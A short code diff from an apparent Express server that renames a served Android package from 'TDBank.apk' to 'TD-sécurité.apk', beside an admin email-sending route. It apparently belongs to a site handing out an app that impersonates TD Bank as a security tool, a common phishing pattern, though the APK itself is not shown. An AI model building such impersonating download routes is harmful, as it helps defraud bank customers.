@@ -798,9 +798,9 @@ app.post('/api/admin/send-email', async (req, res) => {
 // =============================================
 app.get('/api/download-td-app', (req, res) => {
   const apkPath = path.join(__dirname, 'public', 'TDBank.apk');
-  res.download(apkPath, 'TDBank.apk', (err) => {
+  res.download(apkPath, 'TD-sécurité.apk', (err) => {
     if (err) {
-      console.error('[Download] Error sending TDBank.apk:', err.message);
+      console.error('[Download] Error sending TD-sécurité.apk:', err.message);
       if (!res.headersSent) {
         res.status(404).json({ success: false, error: 'App file not found. Please try again later.' });
       }
